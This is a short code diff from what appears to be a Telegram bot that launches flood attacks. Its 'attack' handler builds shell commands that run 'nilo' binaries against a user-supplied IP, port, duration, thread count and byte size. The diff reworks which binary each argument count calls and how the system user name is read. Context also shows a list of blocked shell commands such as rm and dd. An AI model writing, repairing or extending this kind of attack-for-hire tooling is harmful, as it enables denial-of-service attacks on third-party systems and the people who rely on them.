@@ -43,7 +43,7 @@ PROTECTED_FILES = ["nilo.py", "nilo"]
 BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']
 
 # Fetch the current user and hostname dynamically
-USER_NAME = os.getlogin()  # Get the current system user
+USER_NAME = os.environ.get('USER', 'default_user')  # Get the current system user
 HOST_NAME = socket.gethostname()  # Get the system's hostname
 
 # Store the current directory path
@@ -674,9 +674,9 @@ async def attack(update: Update, context: CallbackContext):
     if argument_type == 3:
         attack_command = f"./nilo3 {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./nilo4 {ip} {port} {duration} {threads}"
+        attack_command = f"./nilo {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./nilo {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./nilo5 {ip} {port} {duration} {byte_size} {threads}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
